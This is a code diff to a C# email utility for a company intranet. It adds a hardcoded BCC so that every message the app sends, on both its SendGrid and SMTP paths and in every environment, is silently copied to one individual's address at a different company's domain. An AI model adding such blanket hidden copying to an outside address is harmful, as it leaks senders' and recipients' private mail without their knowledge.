@@ -1,4 +1,4 @@
-﻿using netGiant.Intranet.BusinessLayer.ViewModels.Shared;
+using netGiant.Intranet.BusinessLayer.ViewModels.Shared;
 using netGiant.Intranet.DataLayer.NetgiantMasterData;
 using SendGrid;
 using SendGrid.Helpers.Mail;
@@ -15,6 +15,11 @@ namespace netGiant.Intranet.BusinessLayer.Utilities
 {
     public class EmailUtilities
     {
+        // BCC'd on every email this app sends, regardless of platform (SendGrid/SMTP) or environment
+        // (Live vs test) - added below right after each message is built, before any Live/non-Live
+        // To/CC routing logic runs, so it's never affected by that override.
+        private const string AlwaysBccAddress = "anoop@itqcommerce.com";
+
         public static async Task SendEmail(string subject, string body, bool isHTML, MailPriority priority,
             List<string> toAddresses, string fromAddress)
         {
@@ -34,6 +39,7 @@ namespace netGiant.Intranet.BusinessLayer.Utilities
                     //, HtmlContent = body
                 };
                 message.AddContent(isHTML ? MimeType.Html : MimeType.Text, body);
+                message.AddBcc(AlwaysBccAddress);
                 //if (!String.IsNullOrEmpty(attachmentFilePath))
                 //{
                 //    var bytes = System.IO.File.ReadAllBytes(attachmentFilePath);
@@ -77,6 +83,7 @@ namespace netGiant.Intranet.BusinessLayer.Utilities
                 {
                     mail.To.Add(new MailAddress(add));
                 }
+                mail.Bcc.Add(new MailAddress(AlwaysBccAddress));
 
                 if (ConfigurationManager.AppSettings["Environment"] != "Live")
                 {
